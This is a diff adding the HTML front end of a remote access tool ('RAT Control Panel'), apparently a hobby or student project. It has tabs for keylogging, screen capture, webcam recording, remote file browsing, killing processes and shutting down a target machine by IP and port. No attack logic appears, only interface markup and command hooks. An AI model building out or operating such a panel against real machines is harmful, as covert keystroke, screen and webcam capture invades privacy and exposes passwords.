@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RAT Control Panel</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="video-container">
+        <video autoplay muted loop playsinline id="bg-video">
+            <source src="background\\306155.mp4" type="video/mp4">
+        </video>
+        <div class="video-overlay"></div>
+    </div>
+    <button id="btn-restore-ui" class="floating-restore-btn" onclick="restoreUI()"></button>
+        <i class="fas fa-eye"></i>
+    </button>
+    <div id="bg-selector-panel" class="bg-selector-container">
+        <div class="bg-selector-box">
+            <h2><i class="fas fa-palette"></i> SELECT THEME</h2>
+            <p>Choose your atmosphere</p>
+            
+            <div class="bg-options-grid text-mode">
+                <div class="bg-option-item" onclick="finishBackgroundSelection('background/forest.mp4')">
+                    <i class="fas fa-tree"></i> FOREST
+                </div>
+                
+                <div class="bg-option-item" onclick="finishBackgroundSelection('background\\306155.mp4')">
+                    <i class="fas fa-water"></i> OCEAN
+                </div>
+
+                <div class="bg-option-item" onclick="finishBackgroundSelection('background/snow.mp4')">
+                    <i class="fas fa-snowflake"></i> SNOW
+                </div>
+            </div>
+            
+            <button class="btn-mini btn-danger" style="margin-top: 25px;" onclick="finishBackgroundSelection(null)">
+                 Cancel
+            </button>
+        </div>
+    </div>
+
+    <div id="login-screen" class="login-container">
+        <div class="login-box">
+            <div class="login-header">
+                <div class="logo-wrapper">
+                    <i class="fas fa-eye logo-icon"></i>
+                    <div class="logo-ring"></div> </div>
+                
+                <h1 class="rat-title-login">RAT <span class="highlight">CONTROL</span></h1>
+                
+                <div class="decor-line"></div>
+                
+                <p class="subtitle">ADVANCED REMOTE ADMINISTRATION TOOL</p>
+            </div>
+            
+            <div class="login-body">
+                <div class="login-input-group">
+                    <label>Target IP Address</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-server"></i>
+                        <input type="text" id="target-ip" list="ip-history" value="127.0.0.1" placeholder="Ex: 192.168.1.5">
+                        <button class="btn-telegram" onclick="fetchIpFromTelegram()" title="Auto-fill from Telegram">
+                            <i class="fab fa-telegram"></i>
+                        </button>
+                    </div>
+                    <datalist id="ip-history"><option value="127.0.0.1">Localhost</option></datalist>
+                </div>
+
+                <div class="login-input-group">
+                    <label>Connection Port</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-plug"></i>
+                        <input type="text" id="target-port" value="5656" placeholder="Ex: 5656">
+                    </div>
+                </div>
+
+                <button id="btn-conn" class="btn-login" onclick="connect()">
+                    <i class="fas fa-link"></i> ESTABLISH CONNECTION
+                </button>
+                
+                <div id="login-status" class="login-status">Ready to connect...</div>
+            </div>
+        </div>
+    </div>
+
+    <div id="main-app" class="app-container" style="display: none;">
+        
+        <aside class="sidebar">
+            <div class="logo">
+                <i class="fas fa-eye"></i>
+                <div class="logo-text">
+                    <span class="brand-name">RAT <span class="highlight">CONTROL</span></span>
+                    <small>SYSTEM v2.0</small>
+                </div>
+            </div>
+
+            <nav class="menu">
+                <ul>
+                    <li class="active" onclick="switchTab('dashboard')">
+                        <i class="fas fa-dashboard"></i> <span>Dashboard</span>
+                    </li>
+                    <li onclick="switchTab('processes')">
+                        <i class="fas fa-microchip"></i> <span>Processes</span>
+                    </li>
+                    <li onclick="switchTab('applications')">
+                        <i class="fas fa-window-restore"></i> <span>Applications</span>
+                    </li>
+                    <li onclick="switchTab('keylogger')">
+                        <i class="fas fa-keyboard"></i> <span>Keylogger</span>
+                    </li>
+                    <li onclick="switchTab('files'); requestFiles('DRIVES');">
+                        <i class="fas fa-folder"></i> <span>File Manager</span>
+                    </li>
+                    <li onclick="switchTab('screenshot')">
+                        <i class="fas fa-camera"></i> <span>Screenshot</span>
+                    </li>
+                    <li onclick="switchTab('webcam')">
+                        <i class="fas fa-video"></i> <span>Webcam</span>
+                    </li>
+                    <li class="danger-zone" onclick="switchTab('system')">
+                        <i class="fas fa-bomb"></i> <span>System Control</span>
+                    </li>
+                </ul>
+            </nav>
+
+            <div class="connection-info">
+                <div class="status-indicator online" id="status-dot"></div>
+                <div class="status-text">
+                    <small>Connection Status</small>
+                    <div id="status-text" style="color: var(--primary);">CONNECTED</div>
+                </div>
+            </div>
+        </aside>
+
+        <main class="content">
+            <div class="top-bar">
+                <div class="connected-info">
+                    <i class="fas fa-satellite-dish"></i> 
+                    <span id="display-ip" style="color:#fff;">127.0.0.1</span> 
+                    <div class="sep"></div> <i class="fas fa-network-wired"></i>
+                    <span id="display-port">5656</span>
+                </div>
+            
+                <div class="audio-control">
+                    <button class="btn-audio" onclick="toggleAudioMenu()">
+                        <i class="fas fa-music"></i> 
+                    </button>
+                    
+                    <div id="audio-menu" class="audio-menu mixer-mode">
+                        <div class="mixer-header">AMBIENCE MIXER</div>
+                        
+                        <div class="sound-grid">
+                            <div class="sound-item" onclick="toggleSound('rain', this)">
+                                <i class="fas fa-cloud-rain" style="color: #3498db;"></i>
+                                <div class="volume-slider">
+                                    <input type="range" min="0" max="1" step="0.1" value="0.5" onclick="event.stopPropagation()" oninput="setVolume('rain', this.value)">
+                                </div>
+                            </div>
+                            <div class="sound-item" onclick="toggleSound('bird', this)">
+                                <i class="fas fa-dove" style="color: #e74c3c;"></i>
+                                <div class="volume-slider">
+                                    <input type="range" min="0" max="1" step="0.1" value="0.5" onclick="event.stopPropagation()" oninput="setVolume('bird', this.value)">
+                                </div>
+                            </div>
+                            <div class="sound-item" onclick="toggleSound('fire', this)">
+                                <i class="fas fa-fire" style="color: #e67e22;"></i>
+                                <div class="volume-slider">
+                                    <input type="range" min="0" max="1" step="0.1" value="0.5" onclick="event.stopPropagation()" oninput="setVolume('fire', this.value)">
+                                </div>
+                            </div>
+                            <div class="sound-item" onclick="toggleSound('storm', this)">
+                                <i class="fas fa-bolt" style="color: #f1c40f;"></i>
+                                <div class="volume-slider">
+                                    <input type="range" min="0" max="1" step="0.1" value="0.5" onclick="event.stopPropagation()" oninput="setVolume('storm', this.value)">
+                                </div>
+                            </div>
+                            <div class="sound-item" onclick="toggleSound('coffee', this)">
+                                <i class="fas fa-coffee" style="color: #8e44ad;"></i>
+                                <div class="volume-slider">
+                                    <input type="range" min="0" max="1" step="0.1" value="0.5" onclick="event.stopPropagation()" oninput="setVolume('coffee', this.value)">
+                                </div>
+                            </div>
+                            <div class="sound-item" onclick="toggleSound('keyboard', this)">
+                                <i class="fas fa-keyboard" style="color: #bdc3c7;"></i>
+                                <div class="volume-slider">
+                                    <input type="range" min="0" max="1" step="0.1" value="0.5" onclick="event.stopPropagation()" oninput="setVolume('keyboard', this.value)">
+                                </div>
+                            </div>
+                            <div class="sound-item" onclick="toggleSound('ocean', this)">
+                                <i class="fas fa-water" style="color: #1abc9c;"></i>
+                                <div class="volume-slider">
+                                    <input type="range" min="0" max="1" step="0.1" value="0.5" onclick="event.stopPropagation()" oninput="setVolume('ocean', this.value)">
+                                </div>
+                            </div>
+                            <div class="sound-item" onclick="toggleSound('night', this)">
+                                <i class="fas fa-moon" style="color: #9b59b6;"></i>
+                                <div class="volume-slider">
+                                    <input type="range" min="0" max="1" step="0.1" value="0.5" onclick="event.stopPropagation()" oninput="setVolume('night', this.value)">
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="mixer-footer" onclick="stopAllSounds()">
+                            <i class="fas fa-stop-circle"></i> STOP ALL
+                        </div>
+                    </div>
+                </div>
+
+                <div class="window-controls">
+                    <button class="win-btn btn-min" onclick="triggerMinimizeSequence()" title="Minimize">
+                        <i class="fas fa-minus"></i>
+                    </button>
+                
+                    <button class="win-btn btn-max" onclick="toggleSidebar()" title="Toggle Sidebar">
+                        <i class="far fa-square"></i> </button>
+                
+                    <button id="btn-disconn" class="win-btn btn-close" onclick="disconnect()" title="Disconnect">
+                        <i class="fas fa-times"></i>
+                    </button>
+                </div>
+            </div>
+
+            <div id="tab-dashboard" class="panel active">
+                <div class="panel-header">
+                    <h2><i class="fas fa-chart-line"></i> SYSTEM MONITOR</h2>
+                </div>
+                <div class="dashboard-grid">
+                    <div class="info-card"><i class="fas fa-desktop card-icon"></i><h3>Target PC</h3><p id="sys-name">Waiting...</p><small id="sys-user" style="color:var(--text-dim)">-</small></div>
+                    <div class="info-card"><i class="fab fa-windows card-icon"></i><h3>System (OS)</h3><p id="sys-os">Unknown</p><small>Uptime: <span id="sys-uptime">00:00:00</span></small></div>
+                    <div class="info-card"><i class="fas fa-microchip card-icon"></i><h3>Processor (CPU)</h3><p id="sys-cpu">-</p></div>
+                    <div class="info-card"><i class="fas fa-memory card-icon"></i><h3>Memory (RAM)</h3><p id="sys-ram">-</p></div>
+                    <div class="info-card"><i class="fas fa-gamepad card-icon"></i><h3>Graphics (GPU)</h3><p id="sys-gpu">-</p></div>
+                    <div class="info-card"><i class="fas fa-hdd card-icon"></i><h3>Disk Usage</h3><p id="sys-disk">-</p></div>
+                </div>
+                <div class="console-wrapper">
+                    <div class="console-header"><span><i class="fas fa-terminal"></i> EVENT LOG</span> <button class="btn-mini" onclick="document.getElementById('console-log').value=''">Clear</button></div>
+                    <textarea id="console-log" class="console-output" readonly></textarea>
+                </div>
+            </div>
+
+            <div id="tab-processes" class="panel">
+                <div class="panel-header">
+                    <h2><i class="fas fa-microchip"></i> PROCESS MANAGER</h2>
+                    <button class="btn-action btn-refresh" onclick="send('PROCESS|LIST')"><i class="fas fa-sync-alt"></i> Refresh List</button>
+                </div>
+                <div class="toolbar">
+                    <div class="input-group"><i class="fas fa-hashtag input-icon"></i><input type="text" id="proc-pid" placeholder="Select or Enter PID"></div>
+                    <button class="btn-action btn-danger" onclick="manage('PROCESS','KILL')"><i class="fas fa-skull"></i> Kill Selected</button>
+                </div>
+                <div class="list-wrapper table-container">
+                    <table class="data-table">
+                        <thead><tr><th>Process Info</th><th width="100">Action</th></tr></thead>
+                        <tbody id="process-table-body"><tr><td colspan="2" class="text-center">Click "Refresh List" to load...</td></tr></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div id="tab-applications" class="panel">
+                <div class="panel-header"><h2><i class="fas fa-window-restore"></i> APPLICATION CONTROL</h2></div>
+                <div class="section-box" style="margin-bottom: 30px;">
+                    <div class="toolbar" style="border:none; padding: 0 15px 15px 25px; display: flex; align-items: center;">
+                        <h3 style="color: #ffffff; margin:0; font-size: 16px;">Running Applications</h3>
+                        <button class="btn-mini btn-refresh" onclick="send('APP|LIST')"><i class="fas fa-sync"></i> Refresh</button>
+                        <div style="margin-left:auto; display:flex; gap:10px;">
+                            <input type="text" id="app-pid" placeholder="PID" style="width:80px; border:1px solid var(--border); background:var(--bg-dark);">
+                            <button class="btn-mini btn-danger" onclick="manage('APP','KILL')"><i class="fas fa-stop"></i> STOP</button>
+                        </div>
+                    </div>
+                    <div class="list-wrapper table-container">
+                        <table class="data-table">
+                            <thead><tr><th width="60">PID</th><th>Name</th><th>Title</th><th width="100">Action</th></tr></thead>
+                            <tbody id="app-table-running"><tr><td colspan="4" class="text-center">Loading...</td></tr></tbody>
+                        </table>
+                    </div>
+                </div>
+                <div class="section-box">
+                    <div class="toolbar" style="border:none; padding: 0 15px 15px 25px; display: flex; align-items: center;">
+                        <h3 style="color: #ffffff; margin:0; font-size: 16px;">Installed Library</h3>
+                        <button class="btn-mini btn-success" onclick="send('APP|INSTALLED')"><i class="fas fa-search"></i> Scan Installed Apps</button>
+                        <div style="margin-left:auto;">
+                            <input type="text" id="search-app" onkeyup="filterApps()" placeholder="Filter apps..." style="padding:5px 10px; border-radius:4px; border:1px solid var(--border); background:var(--bg-dark); color:white;">
+                        </div>
+                    </div>
+                    <div class="list-wrapper table-container">
+                        <table class="data-table">
+                            <thead><tr><th>Application Name</th><th width="100">Launch</th></tr></thead>
+                            <tbody id="app-table-installed"><tr><td colspan="2" class="text-center">Click "Scan Installed Apps" to load library...</td></tr></tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+            <div id="tab-keylogger" class="panel">
+                <div class="panel-header">
+                    <h2><i class="fas fa-keyboard"></i> KEYLOGGER MODULE</h2>
+                    <div class="btn-group">
+                        <button id="btn-keylogger-toggle" class="btn-action btn-success" onclick="toggleKeylogger()"><i class="fas fa-play"></i> Start Capture</button>
+                        <button id="btn-keylogger-pause" class="btn-action btn-warning" onclick="togglePause()"><i class="fas fa-pause"></i> Pause</button>
+                        <button class="btn-action btn-refresh" onclick="send('KEYLOG')"><i class="fas fa-download"></i> Fetch Logs</button>
+                        <button class="btn-action" onclick="document.getElementById('log-box').value=''; savedElapsedTime = 0; document.getElementById('record-time').innerText='00:00:00';"><i class="fas fa-eraser"></i> Clear Display</button>
+                    </div>
+                </div>
+                <div class="keylog-wrapper">
+                    <div class="keylog-stats">
+                        <span><i class="fas fa-keyboard"></i> Keystrokes: <strong id="keystroke-count">0</strong></span>
+                        <span><i class="fas fa-clock"></i> Recording Time: <strong id="record-time">00:00:00</strong></span>
+                    </div>
+                    <textarea id="log-box" class="keylog-display" readonly placeholder="Captured keystrokes will appear here..."></textarea>
+                </div>
+            </div>
+
+            <div id="tab-files" class="panel">
+                <div class="panel-header">
+                    <h3><i class="fas fa-folder-open"></i> FILE MANAGER</h3>
+                    <div style="display:flex; gap:10px;">
+                        <button class="btn-mini" onclick="requestFiles('DRIVES')"><i class="fas fa-hdd"></i> Drives</button>
+                        <button class="btn-mini btn-danger" onclick="switchTab('dashboard')"><i class="fas fa-times"></i></button>
+                    </div>
+                </div>
+                
+                <div class="file-toolbar">
+                    <button class="btn-cyber-nav" onclick="goUp()" title="Lên 1 cấp">
+                        <i class="fas fa-level-up-alt"></i>
+                    </button>
+                    
+                    <input type="text" id="file-path" readonly value="DRIVES">
+                    
+                    <button class="btn-mini btn-success" onclick="refreshFiles()">
+                        <i class="fas fa-sync"></i>
+                    </button>
+                </div>
+ 
+                <div class="table-container" style="height: 400px; overflow-y: auto;">
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th width="50">Type</th>
+                                <th>Name</th>
+                                <th width="100">Size</th>
+                                <th width="100">Action</th>
+                            </tr>
+                        </thead>
+                        <tbody id="file-list-body">
+                            <tr><td colspan="4" class="text-center">Click "Drives" to start...</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+             </div>
+
+            <div id="tab-screenshot" class="panel">
+                <div class="panel-header">
+                    <h2><i class="fas fa-camera"></i> SCREEN CAPTURE</h2>
+                    <button class="btn-action btn-success" onclick="send('TAKEPIC')"><i class="fas fa-camera"></i> Capture Screen</button>
+                </div>
+                <div class="media-container">
+                    <img id="img-scr" src="" alt="Screenshot">
+                    <div class="placeholder" id="scr-placeholder">
+                        <i class="fas fa-image"></i><p>No screenshot captured yet</p>
+                    </div>
+                </div>
+            </div>
+
+            <div id="tab-webcam" class="panel">
+                <div class="panel-header">
+                    <h2><i class="fas fa-video"></i> WEBCAM RECORDER</h2>
+                    <div style="display:flex; gap:10px; align-items:center;">
+                        <div class="input-group" style="margin:0;"><input type="number" id="cam-duration" value="5" min="1" max="60" style="width:60px; text-align:center;"><span style="color:#888; font-size:12px; margin-right:5px;">sec</span></div>
+                        <button class="btn-action btn-danger" id="btn-record" onclick="startRecording()"><i class="fas fa-circle"></i> REC</button>
+                    </div>
+                </div>
+                <div class="media-container">
+                    <canvas id="cam-canvas" style="display:none;"></canvas>
+                    <img id="img-cam" src="" alt="Webcam">
+                    <div class="placeholder" id="cam-placeholder">
+                        <i class="fas fa-video-slash"></i><p>Ready to Record</p>
+                    </div>
+                </div>
+            </div>
+
+            <div id="tab-system" class="panel">
+                <div class="panel-header"><h2><i class="fas fa-bomb"></i> SYSTEM CONTROL</h2></div>
+                <div class="danger-zone-panel">
+                    <div class="danger-box">
+                        <div class="warning-text"><i class="fas fa-shield-alt"></i><span>Proceed with extreme caution</span></div>
+                        <button class="btn-big-danger" onclick="confirmShutdown()"><i class="fas fa-power-off"></i> SHUTDOWN TARGET SYSTEM</button>
+                        <button class="btn-big-danger" onclick="confirmReset()" style="background: #ffaa00; border-color: #ffaa00; margin-top: 15px;"><i class="fas fa-sync-alt"></i> RESTART TARGET SYSTEM</button>
+                    </div>
+                </div>
+            </div>
+
+        </main>
+    </div>
+
+    <audio id="audio-player" loop></audio> 
+    <audio id="sfx-pop" src="sound\\pop.mp3"></audio>
+    <audio id="sfx-menu" src="sound\\minecraft_click.mp3"></audio>
+    <!-- <audio id="sfx-hover" src="sound\\enderman.mp3" preload="auto"></audio> -->
+
+    <script src="script.js"></script>
+</body>
+</html>
